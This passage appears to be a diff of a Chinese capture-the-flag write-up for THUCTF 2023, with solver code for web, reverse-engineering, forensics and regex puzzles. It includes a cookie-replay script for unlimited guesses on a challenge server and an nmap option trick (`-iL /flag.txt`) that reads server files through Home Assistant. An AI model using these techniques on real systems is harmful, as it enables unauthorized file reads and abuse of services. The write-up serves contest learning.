+{"data":{"level":"2","remaining_guesses":"8","target":"\uD83D\uDC7C\uD83D\uDC7A\uD83D\uDC78\uD83D\uDC60\uD83D\uDC7C\uD83D\uDC67\uD83D\uDC52\uD83D\uDC58\uD83D\uDC55\uD83D\uDC5F\uD83D\uDC60\uD83D\uDC5D\uD83D\uDC82\uD83D\uDC48\uD83D\uDC86\uD83D\uDC79\uD83D\uDC48\uD83D\uDC7B\uD83D\uDC66\uD83D\uDC64\uD83D\uDC3F\uD83D\uDC89\uD83D\uDC5C\uD83D\uDC61\uD83D\uDC56\uD83D\uDC46\uD83D\uDC41\uD83D\uDC6A\uD83D\uDC89\uD83D\uDC55\uD83D\uDC7C\uD83D\uDC66\uD83D\uDC7F\uD83D\uDC43\uD83D\uDC41\uD83D\uDC87\uD83D\uDC3B\uD83D\uDC62\uD83D\uDC66\uD83D\uDC42\uD83D\uDC55\uD83D\uDC58\uD83D\uDC7A\uD83D\uDC82\uD83D\uDC41\uD83D\uDC74\uD83D\uDC5E\uD83D\uDC85\uD83D\uDC7E\uD83D\uDC80\uD83D\uDC46\uD83D\uDC7F\uD83D\uDC5A\uD83D\uDC56\uD83D\uDC76\uD83D\uDC5F\uD83D\uDC85\uD83D\uDC5A\uD83D\uDC86\uD83D\uDC5C\uD83D\uDC44\uD83D\uDC83\uD83D\uDC78\uD83D\uDC75"},"nbf":1697273083,"iat":1697273083}
+```
+
+![flag2](thuctf2023/emodle-flag2.png)
+
+#### Level 3
+
+level 3 的 JWT 不再包含答案，但包含 seed 和剩余猜测次数。这说明游戏状态存于 client side，一直用同一个 Cookie 而不接受服务器发来的新 Cookie 即可无限次猜测，然后就和 level 1 一样了（下面的代码主要就是改了个设置 Cookie）。
+
+```python
+import re
+import requests
+
+port = 50326
+url = f"http://chal.thuctf.redbud.info:{port}/level3"
+
+emojis = []
+
+with open("emoji-sequences.txt") as seq:
+    for line in seq:
+        if len(line) < 2 or line.startswith("#"):
+            continue
+        code = line.split()[0]
+        if ".." in code:
+            l, r = code.split("..")
+        else:
+            l, r = code, code
+        for i in range(int(l, 16), int(r, 16) + 1):
+            emojis.append(chr(i))
+
+
+emojis = "".join(set(emojis))
+
+cookies = None
+
+def guess(g: str):
+    global cookies
+    res = requests.get(url, params={"guess": g}, cookies=cookies)
+    if cookies is None:
+        cookies = res.cookies
+    m = re.findall('results\\.push\\("([🟥🟨🟩]*)"\\)', res.text)[0]
+    result = []
+    for c in m:
+        if c == "🟥":
+            result.append("r")
+        elif c == "🟨":
+            result.append("y")
+        else:
+            result.append("g")
+    if result.count('g') == 64:
+        print(res.text)
+    return result
+
+
+answer = ["?"] * 64
+charset = set()
+
+for i in range(0, len(emojis), 64):
+    res = guess(emojis[i : i + 64])
+    for j in range(64):
+        if i + j >= len(emojis):
+            break
+        if res[j] != "r":
+            charset.add(emojis[i + j])
+
+for e in charset:
+    res = guess(e * 64)
+    for j in range(64):
+        if res[j] == "g":
+            answer[j] = e
+
+guess("".join(answer))
+```
+
+![flag3](thuctf2023/emodle-flag3.png)
+
+### 逝界计划
+
+添加 nmap tracker integration，设置其命令选项，使用 `-iL /flag.txt` 可以读取到 flag，使用 `-oN /config/home-assistant.log` 可以将运行结果显示在 log 中。
+
+![flag](thuctf2023/hass-flag.png)
+
+## Reverse
+
+### 绝妙的多项式
+
+#### Level 1
+
+反编译得到核心代码如下，其中 `mint` 是模 998244353 的计算，即算出来的是“将输入字符串视作 1~len 进制数”模 998244353 的值，然后解方程即可。（当然也可以 Lagrange 插值。）
+
+```cpp
+for (i = 1; i <= flagLength; i = i + 1)
+{
+    sum = 0;
+    exp = 1;
+    for (j = 0; j < flagLength; j = j + 1)
+    {
+        x = (mint)mint::operator*((mint *)((long)j * 4 + (long)poly), exp);
+        mint::operator+=((mint *)&sum, x);
+        mint::mint((mint *)&i_m, i);
+        mint::operator*=((mint *)&exp, i_m);
+    }
+    if (sum != (&DAT_00105020)[i - 1])
+    {
+        pbVar1 = std::operator<<((basic_ostream *)std::cout, "Failed, please try again!");
+        std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar1, std::endl<>);
+        uVar3 = 1;
+        goto LAB_00101a65;
+    }
+}
+```
+
+```python
+mod = 998244353
+
+c = [
+    0x00000CB0,
+    0x168C83AC,
+    0x0D1D79D4,
+    0x0228A0DD,
+    0x00E57451,
+    0x25F3BF43,
+    0x0F1653F7,
+    0x395B969F,
+    0x37198928,
+    0x1651D179,
+    0x20F1DF11,
+    0x38F4DC2B,
+    0x37CDD474,
+    0x2043323C,
+    0x0E4CB532,
+    0x14FE0ADA,
+    0x2DADCE9D,
+    0x2C325FFB,
+    0x00D9357C,
+    0x1C90D4E6,
+    0x19A7E972,
+    0x24EAABA9,
+    0x2C2A70ED,
+    0x315995C6,
+    0x1E48BE27,
+    0x099C05B0,
+    0x0EE775B0,
+    0x27F52AA6,
+    0x136F26DB,
+    0x05CE66CF,
+    0x37F9958D,
+    0x2D634F37,
+    0x0F424CE3,
+    0x2348C868,
+    0x0A16629F,
+    0x2ACC2B38,
+    0x0F7FEB61,
+    0x159215F5,
+]
+
+n = len(c)
+
+a = []
+for i in range(n):
+    a.append([pow(i + 1, j, mod) for j in range(n)] + [c[i]])
+
+for i in range(n):
+    for j in range(i, n):
+        if a[j][i]:
+            a[i], a[j] = a[j], a[i]
+            break
+    inv = pow(a[i][i], -1, mod)
+    for k in range(i, n + 1):
+        a[i][k] = a[i][k] * inv % mod
+    for j in range(n):
+        if i == j:
+            continue
+        mul = a[j][i]
+        for k in range(i, n + 1):
+            a[j][k] = (a[j][k] - mul * a[i][k]) % mod
+
+for i in range(n):
+    print(chr(a[i][n]), end='')
+```
+
+![flag1](thuctf2023/poly-flag1.png)
+
+#### Level 2
+
+反编译发现多项式长度被扩充到了 2 的幂（其实到这里如果是 OIer 应该已经可以看出来了；~~其实看到模数甚至题目名就应该早猜到了~~）：
+
+```cpp
+bVar1 = std::__lg(0x2f);
+n = 2 << (bVar1 & 0x1f);
+a = malloc((long)n << 2);
+memset(a,0,(long)n * 4);
+```
+
+后面调用了一个函数，核心部分如下，确认是 [NTT](https://oi-wiki.org/math/poly/ntt/)：
+
+```cpp
+k = n;
+while (1 < k)
+{
+    k = k / 2;
+    for (i = 0; i < n; i = i + k * 2)
+    {
+        for (j = 0; j < k; j = j + 1)
+        {
+            uVar3 = *(undefined4 *)(&DAT_00505280 + (long)(k + j) * 4);
+            local_38 = *(undefined4 *)(a + (long)(j + i) * 4);
+            local_34 = *(undefined4 *)(a + (long)(k + i + j) * 4);
+            iVar1 = j + i;
+            uVar2 = mint::operator+((mint *)&local_38, SUB41(local_34, 0));
+            *(undefined4 *)((long)iVar1 * 4 + a) = uVar2;
+            local_30 = mint::operator-((mint *)&local_38, SUB41(local_34, 0));
+            iVar1 = k + i + j;
+            uVar3 = mint::operator*((mint *)&local_30, SUB41(uVar3, 0));
+            *(undefined4 *)((long)iVar1 * 4 + a) = uVar3;
+        }
+    }
+}
+```
+
+~~去洛谷上找到失散多年的多项式板子~~，进行 NTT 逆变换即可。
+
+```cpp
+#include <algorithm>
+#include <iostream>
+
+using namespace std;
+
+typedef long long ll;
+
+const int mod = 998244353;
+const int N = 64;
+const int G = 3;
+
+int n, r[N];
+
+int a[N] = {
+    0x00000fcc, 0x00000104, 0x0749db91, 0x343624e8, 0x0d13ca29, 0x272a2071, 0x36a7f6c3, 0x0c1a1e65,
+    0x1f1ad239, 0x01f3ec88, 0x020a0b87, 0x36c3abd1, 0x05559031, 0x34c4b3f4, 0x12708155, 0x0c18c538,
+    0x2afc9af2, 0x11eaefa9, 0x088b5998, 0x2cc0fd8f, 0x10370a24, 0x09c6d2a3, 0x29d08b05, 0x04f4d794,
+    0x2c5f4e4e, 0x3a038304, 0x2071b91e, 0x1b445996, 0x31373cf5, 0x21e86de9, 0x37bf21f8, 0x2f9134fb,
+    0x21770505, 0x027a31ad, 0x1043be97, 0x0c84bff9, 0x2e286891, 0x27a8054e, 0x3886de12, 0x20e03387,
+    0x1bfe24ef, 0x01839cf5, 0x2562af12, 0x09009f44, 0x284b4a3b, 0x2eaa70ec, 0x0859bba4, 0x1507cc41,
+    0x3b34c2e5, 0x2a5819f3, 0x2a1aa122, 0x15c8a1b3, 0x2b94d4e7, 0x3760071c, 0x2e63c3af, 0x315e10bd,
+    0x0b54503c, 0x06f4408e, 0x09400d3e, 0x38b88f00, 0x336d0b03, 0x164dcc04, 0x2edbbdf1, 0x0e53e235};
+
+int qpow(int x, int y)
+{
+    int out = 1;
+    while (y)
+    {
+        if (y & 1)
+            out = (ll)out * x % mod;
+        x = (ll)x * x % mod;
+        y >>= 1;
+    }
+    return out;
+}
+
+void ntt(int *A, int type, int L)
+{
+    int i, j, k, wn, w, t;
+    for (i = 1; i < L; ++i)
+        if (i < r[i])
+            swap(A[i], A[r[i]]);
+    for (i = 1; i < L; i <<= 1)
+    {
+        wn = qpow(G, (mod - 1) / (i << 1));
+        for (j = 0; j < L; j += i * 2)
+        {
+            for (k = 0, w = 1; k < i; ++k, w = (ll)w * wn % mod)
+            {
+                t = (ll)A[i + j + k] * w % mod;
+                A[i + j + k] = (A[j + k] - t + mod) % mod;
+                A[j + k] = (A[j + k] + t) % mod;
+            }
+        }
+    }
+    if (type == -1)
+    {
+        reverse(A + 1, A + L);
+        int inv = qpow(L, mod - 2);
+        for (i = 0; i < L; ++i)
+            A[i] = (ll)A[i] * inv % mod;
+    }
+}
+
+int main()
+{
+    ntt(a, -1, N);
+
+    for (int i = 0; i < N; ++i)
+        putchar(a[i]);
+}
+```
+
+![flag2](thuctf2023/poly-flag2.png)
+
+#### Level 3
+
+反编译发现是多项式乘法：
+
+```cpp
+n = 2 << (bVar1 & 0x1f);
+a = malloc((long)(n * 2) << 2);
+b = malloc((long)(n * 2) << 2);
+memset(a,0,(long)(n * 2) * 4);
+memset(b,0,(long)(n * 2) * 4);
+for (i1 = 0; i1 < len; i1 = i1 + 1) {
+    pcVar3 = (char *)std::__cxx11::basic_string<>::operator[]((ulong)local_48);
+    mint::mint((mint *)&local_78,(int)*pcVar3);
+    *(undefined4 *)((long)i1 * 4 + (long)a) = local_78;
+}
+for (i2 = 0; i2 < n; i2 = i2 + 1) {
+    mint::mint((mint *)&local_78,u_welcome_to_the_world_of_polynomi_00305020[i2 % 0x22]);
+    *(undefined4 *)((long)i2 * 4 + (long)b) = local_78;
+}
+FUN_001014be(a,n * 2);
+FUN_001014be(b,n * 2);
+for (i3 = 0; i3 < n * 2; i3 = i3 + 1) {
+    mint::operator*=((mint *)((long)a + (long)i3 * 4),
+                    SUB41(*(undefined4 *)((long)i3 * 4 + (long)b),0));
+}
+FUN_00101627(a,n * 2);
+```
+
+求逆然后乘起来即可：
+
+```cpp
+#include <algorithm>
+#include <cstring>
+#include <iostream>
+
+using namespace std;
+
+typedef long long ll;
+
+const int mod = 998244353;
+const int N = 64;
+const int G = 3;
+
+int n, r[N * 2];
+
+int c[N * 2] = {
+    0x0000270c, 0x0000429c, 0x0000675b, 0x00007f8a, 0x0000a59b, 0x0000c1cd, 0x0000f6cb, 0x00010e02,
+    0x00012f88, 0x00014c8b, 0x00015525, 0x00018924, 0x0001a398, 0x0001b545, 0x0001c2af, 0x0002018c,
+    0x0001fdd4, 0x00023333, 0x00026068, 0x00029557, 0x00028aef, 0x0002a872, 0x0002e6e4, 0x0002ee5e,
+    0x00030a9d, 0x00030cee, 0x00033ec0, 0x0003629a, 0x00037487, 0x00039d4e, 0x0003e2f7, 0x0003eccf,
+    0x0004304b, 0x00045d64, 0x0004715e, 0x0004c474, 0x0004ea5e, 0x0004f081, 0x0004fe29, 0x00052656,
+    0x00053dc1, 0x0005355a, 0x00054bb5, 0x0005560c, 0x0005296c, 0x0005523e, 0x00054cba, 0x00053930,
+    0x0005265f, 0x000552f2, 0x0005316a, 0x00053e95, 0x00055823, 0x000564b7, 0x00052cdc, 0x00051228,
+    0x00055f28, 0x00054d58, 0x0005454b, 0x00052f57, 0x00054d6f, 0x00053e11, 0x00055f91, 0x00055a50};
+
+const char s[] = "welcome to the world of polynomial";
+int a[N * 2], b[N * 2], aa[N * 2], bb[N * 2];
+
+int qpow(int x, int y)
+{
+    int out = 1;
+    while (y)
+    {
+        if (y & 1)
+            out = (ll)out * x % mod;
+        x = (ll)x * x % mod;
+        y >>= 1;
+    }
+    return out;
+}
+
+void ntt(int *A, int type, int L)
+{
+    int i, j, k, wn, w, t;
+    for (i = 1; i < L; ++i)
+        if (i < r[i])
+            swap(A[i], A[r[i]]);
+    for (i = 1; i < L; i <<= 1)
+    {
+        wn = qpow(G, (mod - 1) / (i << 1));
+        for (j = 0; j < L; j += i * 2)
+        {
+            for (k = 0, w = 1; k < i; ++k, w = (ll)w * wn % mod)
+            {
+                t = (ll)A[i + j + k] * w % mod;
+                A[i + j + k] = (A[j + k] - t + mod) % mod;
+                A[j + k] = (A[j + k] + t) % mod;
+            }
+        }
+    }
+    if (type == -1)
+    {
+        reverse(A + 1, A + L);
+        int inv = qpow(L, mod - 2);
+        for (i = 0; i < L; ++i)
+            A[i] = (ll)A[i] * inv % mod;
+    }
+}
+
+void polyinv(int L)
+{
+    if (L == 1)
+    {
+        b[0] = qpow(a[0], mod - 2);
+        return;
+    }
+    int i;
+    polyinv(L >> 1);
+    memset(bb, 0, sizeof(bb));
+    memcpy(bb, b, sizeof(int) * (L >> 1));
+    memcpy(aa, a, sizeof(int) * L);
+    for (i = 0; i < (L << 1); ++i)
+        r[i] = (r[i >> 1] >> 1) | ((i & 1) * L);
+    ntt(aa, 1, L << 1);
+    ntt(bb, 1, L << 1);
+    for (i = 0; i < (L << 1); ++i)
+        aa[i] = (ll)aa[i] * bb[i] % mod * bb[i] % mod;
+    ntt(aa, -1, L << 1);
+    for (i = 0; i < L; ++i)
+        b[i] = (2ll * b[i] - aa[i] + mod) % mod;
+}
+
+int main()
+{
+    for (int i = 0; i < N; ++i)
+        a[i] = s[i % 0x22];
+
+    polyinv(N);
+    ntt(b, 1, N * 2);
+    ntt(c, 1, N * 2);
+    for (int i = 0; i < N * 2; ++i)
+        a[i] = (ll)b[i] * c[i] % mod;
+    ntt(a, -1, N * 2);
+
+    for (int i = 0; i < N; ++i)
+        putchar(a[i]);
+}
+
+```
+
+![flag3](thuctf2023/poly-flag3.png)
+
+### 汉化绿色版免费下载
+
+#### Level 1
+
+使用 [xp3-tool](https://github.com/storycraft/xp3-tool) 解压 `data.xp3`，在 `scenario/done.ks` 中看到 flag。
+
+![flag1](thuctf2023/汉化绿色版-flag1.png)
+
+#### Level 2
+
+根据 `scenario` 中的文件，可以发现检查两次输入是否相同是通过计算 hash 实现的。
+
+使用 [KirikiriDescrambler](https://github.com/arcusmaximus/KirikiriTools) 解密 `savedata` 中的文件，在 `data0.kdt` 中得到 round 1 的 hash 为 7748521，在 `datasu.ksd` 中得到每个字符使用的次数，然后枚举排列得到 flag。
+
+```cpp
+#include <algorithm>
+#include <cstdio>
+#include <vector>
+
+using namespace std;
+
+const int mod = 0x125e591;
+const int k = 13337;
+const int start = 1337;
+const int target = 7748521;
+
+const char charset[] = " AEIOU";
+
+bool check(const vector<int> &a)
+{
+    int h = start;
+    for (int x : a)
+        h = (1ll * h * k + x * 11) % mod;
+    h = (1ll * h * k + 66) % mod;
+    return h == target;
+}
+
+int main()
+{
+    vector<int> a = {1, 1, 1, 1, 1, 1, 2, 2, 2, 3, 4, 4, 4, 4, 4, 4};
+
+    do
+    {
+        if (check(a))
+        {
+            for (int x : a)
+                putchar(charset[x]);
+            break;
+        }
+    } while (next_permutation(a.begin(), a.end()));
+}
+```
+
+![flag2](thuctf2023/汉化绿色版-flag2.png)
+
+## Forensics
+
+### Z 公司的服务器
+
+#### Level 1
+
+在 `konsole` 中使用 `nc` 连接到实例会提示为 ZMODEM 选择存储位置，但选完之后会报错，不知道是为什么。但知道是 ZMODEM 就可以在网上搜索工具，最后搜到的是 Windows 下的 Tera Term，总之它可以正常工作（，连上实例选择 ZMODEM receive 即可。
+
+![Tera Term](thuctf2023/zserver-teraterm.png)
+
+![flag1](thuctf2023/zserver-flag1.png)
+
+#### Level 2
+
+要分析 ZMODEM 流量，搜一下发现了 [手撸ZMODEM协议 - 知乎](https://zhuanlan.zhihu.com/p/579720546)，其中比较重要的是遇到 `0x18` 后面一个字符会转义。按照这个规则，参考其给出的 [代码](https://gitee.com/scu319hy/szrz_handler/tree/master)，可以写一个简化的数据提取：
+
+```python
+with open('level2.bin', 'rb') as f:
+    data = f.read()
+
+result = []
+esc = False
+skip = 0
+i = -1
+while i + 1 < len(data):
+    i += 1
+    c = data[i]
+    if c == 0x18:
+        esc = True
+        continue
+    if esc:
+        if c & 0x60 == 0x40:
+            if skip:
+                skip -= 1
+            else:
+                result.append(c ^ 0x40)
+        else:
+            skip += 2
+    elif skip:
+        skip -= 1
+    else:
+        result.append(c)
+    esc = False
+
+with open('level2.out', 'wb') as f:
+    f.write(bytes(result))
+```
+
+这个实现是不完善的，[得到的 JPEG 文件](/images/2023/10/thuctf2023/zserver-flag2-corrupted.jpg) 是破损的。
+
+但是没关系，将它调整一下：
+
+![flag2-fixed](thuctf2023/zserver-flag2-fixed.png)
+
+可以读出 `flag{t***f1c_aNa*y51s*4*ZMOD*M}`，根据语义可以猜出 flag 为 `flag{traFf1c_aNa1y51s_4_ZMODEM}`。
+
+## PPC
+
+### 关键词过滤喵，谢谢喵
+
+#### Level 1 喵
+
+数数喵，进位喵。
+
+```
+    重复把【[^a]】替换成【a】喵
+循环喵：
+    把【^$】替换成【0】喵
+    把【^a】替换成【1】喵
+    把【0a】替换成【1】喵
+    把【1a】替换成【2】喵
+    把【2a】替换成【3】喵
+    把【3a】替换成【4】喵
+    把【4a】替换成【5】喵
+    把【5a】替换成【6】喵
+    把【6a】替换成【7】喵
+    把【7a】替换成【8】喵
+    把【8a】替换成【9】喵
+    把【^9a】替换成【10】喵
+    把【09a】替换成【10】喵
+    把【19a】替换成【20】喵
+    把【29a】替换成【30】喵
+    把【39a】替换成【40】喵
+    把【49a】替换成【50】喵
+    把【59a】替换成【60】喵
+    把【69a】替换成【70】喵
+    把【79a】替换成【80】喵
+    把【89a】替换成【90】喵
+    把【^99a】替换成【100】喵
+    把【099a】替换成【100】喵
+    把【199a】替换成【200】喵
+    把【299a】替换成【300】喵
+    把【399a】替换成【400】喵
+    把【499a】替换成【500】喵
+    把【599a】替换成【600】喵
+    把【699a】替换成【700】喵
+    把【799a】替换成【800】喵
+    把【899a】替换成【900】喵
+    把【^999a】替换成【1000】喵
+    把【0999a】替换成【1000】喵
+    把【1999a】替换成【2000】喵
+    把【2999a】替换成【3000】喵
+    把【3999a】替换成【4000】喵
+    把【4999a】替换成【5000】喵
+    把【5999a】替换成【6000】喵
+    把【6999a】替换成【7000】喵
+    把【7999a】替换成【8000】喵
+    把【8999a】替换成【9000】喵
+    把【^9999a】替换成【10000】喵
+    把【09999a】替换成【10000】喵
+    把【19999a】替换成【20000】喵
+    把【29999a】替换成【30000】喵
+    把【39999a】替换成【40000】喵
+    把【49999a】替换成【50000】喵
+    把【59999a】替换成【60000】喵
+    把【69999a】替换成【70000】喵
+    把【79999a】替换成【80000】喵
+    把【89999a】替换成【90000】喵
+    把【^99999a】替换成【100000】喵
+    把【099999a】替换成【100000】喵
+    把【199999a】替换成【200000】喵
+    把【299999a】替换成【300000】喵
+    把【399999a】替换成【400000】喵
+    把【499999a】替换成【500000】喵
+    把【599999a】替换成【600000】喵
+    把【699999a】替换成【700000】喵
+    把【799999a】替换成【800000】喵
+    把【899999a】替换成【900000】喵
+    如果看到【a】就跳转到【循环喵】喵
+    谢谢喵
+```
+
+![flag1 喵](thuctf2023/filtered-flag1.png)
+
+#### Level 2 喵
+
+根据提示，可以使用 emoji 作为分隔符喵，然后可以每行分别进行字数统计喵，最后进行基数排序喵（逐位通过交换相邻逆序对进行稳定排序喵）。
+
+```
+    重复把【^([^🤔\n]+)$】替换成【\n\1🤔\1\n】喵
+    重复把【^([^🤔\n]+)\n】替换成【\n\1🤔\1\n】喵
+    重复把【\n([^🤔\n]+)$】替换成【\n\1🤔\1\n】喵
+    重复把【\n([^🤔\n]+)\n】替换成【\n\1🤔\1\n】喵
+    重复把【\n\n】替换成【\n】喵
+    重复把【(🤔|🙂)[^\n🙂]】替换成【\1🙂】喵
+    重复把【🤔🙂】替换成【🤔0000🙂】喵
+字数统计循环喵：
+    把【0🙂】替换成【1】喵
+    把【1🙂】替换成【2】喵
+    把【2🙂】替换成【3】喵
+    把【3🙂】替换成【4】喵
+    把【4🙂】替换成【5】喵
+    把【5🙂】替换成【6】喵
+    把【6🙂】替换成【7】喵
+    把【7🙂】替换成【8】喵
+    把【8🙂】替换成【9】喵
+    把【09🙂】替换成【10】喵
+    把【19🙂】替换成【20】喵
+    把【29🙂】替换成【30】喵
+    把【39🙂】替换成【40】喵
+    把【49🙂】替换成【50】喵
+    把【59🙂】替换成【60】喵
+    把【69🙂】替换成【70】喵
+    把【79🙂】替换成【80】喵
+    把【89🙂】替换成【90】喵
+    把【099🙂】替换成【100】喵
+    把【199🙂】替换成【200】喵
+    把【299🙂】替换成【300】喵
+    把【399🙂】替换成【400】喵
+    把【499🙂】替换成【500】喵
+    把【599🙂】替换成【600】喵
+    把【699🙂】替换成【700】喵
+    把【799🙂】替换成【800】喵
+    把【899🙂】替换成【900】喵
+    把【0999🙂】替换成【1000】喵
+    把【1999🙂】替换成【2000】喵
+    把【2999🙂】替换成【3000】喵
+    把【3999🙂】替换成【4000】喵
+    把【4999🙂】替换成【5000】喵
+    把【5999🙂】替换成【6000】喵
+    把【6999🙂】替换成【7000】喵
+    把【7999🙂】替换成【8000】喵
+    把【8999🙂】替换成【9000】喵
+    如果看到【🙂】就跳转到【字数统计循环喵】喵
+排序循环个喵：
+    把【\n(.*🤔...[1-9])\n(.*🤔...[0-0])\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔...[2-9])\n(.*🤔...[0-1])\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔...[3-9])\n(.*🤔...[0-2])\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔...[4-9])\n(.*🤔...[0-3])\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔...[5-9])\n(.*🤔...[0-4])\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔...[6-9])\n(.*🤔...[0-5])\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔...[7-9])\n(.*🤔...[0-6])\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔...[8-9])\n(.*🤔...[0-7])\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔...[9-9])\n(.*🤔...[0-8])\n】替换成【\n\2\n\1\n】喵
+    如果看到【\n(.*🤔...[1-9])\n(.*🤔...[0-0])\n】就跳转到【排序循环个喵】喵
+    如果看到【\n(.*🤔...[2-9])\n(.*🤔...[0-1])\n】就跳转到【排序循环个喵】喵
+    如果看到【\n(.*🤔...[3-9])\n(.*🤔...[0-2])\n】就跳转到【排序循环个喵】喵
+    如果看到【\n(.*🤔...[4-9])\n(.*🤔...[0-3])\n】就跳转到【排序循环个喵】喵
+    如果看到【\n(.*🤔...[5-9])\n(.*🤔...[0-4])\n】就跳转到【排序循环个喵】喵
+    如果看到【\n(.*🤔...[6-9])\n(.*🤔...[0-5])\n】就跳转到【排序循环个喵】喵
+    如果看到【\n(.*🤔...[7-9])\n(.*🤔...[0-6])\n】就跳转到【排序循环个喵】喵
+    如果看到【\n(.*🤔...[8-9])\n(.*🤔...[0-7])\n】就跳转到【排序循环个喵】喵
+    如果看到【\n(.*🤔...[9-9])\n(.*🤔...[0-8])\n】就跳转到【排序循环个喵】喵
+排序循环十喵：
+    把【\n(.*🤔..[1-9].)\n(.*🤔..[0-0].)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔..[2-9].)\n(.*🤔..[0-1].)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔..[3-9].)\n(.*🤔..[0-2].)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔..[4-9].)\n(.*🤔..[0-3].)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔..[5-9].)\n(.*🤔..[0-4].)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔..[6-9].)\n(.*🤔..[0-5].)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔..[7-9].)\n(.*🤔..[0-6].)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔..[8-9].)\n(.*🤔..[0-7].)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔..[9-9].)\n(.*🤔..[0-8].)\n】替换成【\n\2\n\1\n】喵
+    如果看到【\n(.*🤔..[1-9].)\n(.*🤔..[0-0].)\n】就跳转到【排序循环十喵】喵
+    如果看到【\n(.*🤔..[2-9].)\n(.*🤔..[0-1].)\n】就跳转到【排序循环十喵】喵
+    如果看到【\n(.*🤔..[3-9].)\n(.*🤔..[0-2].)\n】就跳转到【排序循环十喵】喵
+    如果看到【\n(.*🤔..[4-9].)\n(.*🤔..[0-3].)\n】就跳转到【排序循环十喵】喵
+    如果看到【\n(.*🤔..[5-9].)\n(.*🤔..[0-4].)\n】就跳转到【排序循环十喵】喵
+    如果看到【\n(.*🤔..[6-9].)\n(.*🤔..[0-5].)\n】就跳转到【排序循环十喵】喵
+    如果看到【\n(.*🤔..[7-9].)\n(.*🤔..[0-6].)\n】就跳转到【排序循环十喵】喵
+    如果看到【\n(.*🤔..[8-9].)\n(.*🤔..[0-7].)\n】就跳转到【排序循环十喵】喵
+    如果看到【\n(.*🤔..[9-9].)\n(.*🤔..[0-8].)\n】就跳转到【排序循环十喵】喵
+排序循环百喵：
+    把【\n(.*🤔.[1-9]..)\n(.*🤔.[0-0]..)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔.[2-9]..)\n(.*🤔.[0-1]..)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔.[3-9]..)\n(.*🤔.[0-2]..)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔.[4-9]..)\n(.*🤔.[0-3]..)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔.[5-9]..)\n(.*🤔.[0-4]..)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔.[6-9]..)\n(.*🤔.[0-5]..)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔.[7-9]..)\n(.*🤔.[0-6]..)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔.[8-9]..)\n(.*🤔.[0-7]..)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔.[9-9]..)\n(.*🤔.[0-8]..)\n】替换成【\n\2\n\1\n】喵
+    如果看到【\n(.*🤔.[1-9]..)\n(.*🤔.[0-0]..)\n】就跳转到【排序循环百喵】喵
+    如果看到【\n(.*🤔.[2-9]..)\n(.*🤔.[0-1]..)\n】就跳转到【排序循环百喵】喵
+    如果看到【\n(.*🤔.[3-9]..)\n(.*🤔.[0-2]..)\n】就跳转到【排序循环百喵】喵
+    如果看到【\n(.*🤔.[4-9]..)\n(.*🤔.[0-3]..)\n】就跳转到【排序循环百喵】喵
+    如果看到【\n(.*🤔.[5-9]..)\n(.*🤔.[0-4]..)\n】就跳转到【排序循环百喵】喵
+    如果看到【\n(.*🤔.[6-9]..)\n(.*🤔.[0-5]..)\n】就跳转到【排序循环百喵】喵
+    如果看到【\n(.*🤔.[7-9]..)\n(.*🤔.[0-6]..)\n】就跳转到【排序循环百喵】喵
+    如果看到【\n(.*🤔.[8-9]..)\n(.*🤔.[0-7]..)\n】就跳转到【排序循环百喵】喵
+    如果看到【\n(.*🤔.[9-9]..)\n(.*🤔.[0-8]..)\n】就跳转到【排序循环百喵】喵
+排序循环千喵：
+    把【\n(.*🤔[1-9]...)\n(.*🤔[0-0]...)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔[2-9]...)\n(.*🤔[0-1]...)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔[3-9]...)\n(.*🤔[0-2]...)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔[4-9]...)\n(.*🤔[0-3]...)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔[5-9]...)\n(.*🤔[0-4]...)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔[6-9]...)\n(.*🤔[0-5]...)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔[7-9]...)\n(.*🤔[0-6]...)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔[8-9]...)\n(.*🤔[0-7]...)\n】替换成【\n\2\n\1\n】喵
+    把【\n(.*🤔[9-9]...)\n(.*🤔[0-8]...)\n】替换成【\n\2\n\1\n】喵
+    如果看到【\n(.*🤔[1-9]...)\n(.*🤔[0-0]...)\n】就跳转到【排序循环千喵】喵
+    如果看到【\n(.*🤔[2-9]...)\n(.*🤔[0-1]...)\n】就跳转到【排序循环千喵】喵
+    如果看到【\n(.*🤔[3-9]...)\n(.*🤔[0-2]...)\n】就跳转到【排序循环千喵】喵
+    如果看到【\n(.*🤔[4-9]...)\n(.*🤔[0-3]...)\n】就跳转到【排序循环千喵】喵
+    如果看到【\n(.*🤔[5-9]...)\n(.*🤔[0-4]...)\n】就跳转到【排序循环千喵】喵
+    如果看到【\n(.*🤔[6-9]...)\n(.*🤔[0-5]...)\n】就跳转到【排序循环千喵】喵
+    如果看到【\n(.*🤔[7-9]...)\n(.*🤔[0-6]...)\n】就跳转到【排序循环千喵】喵
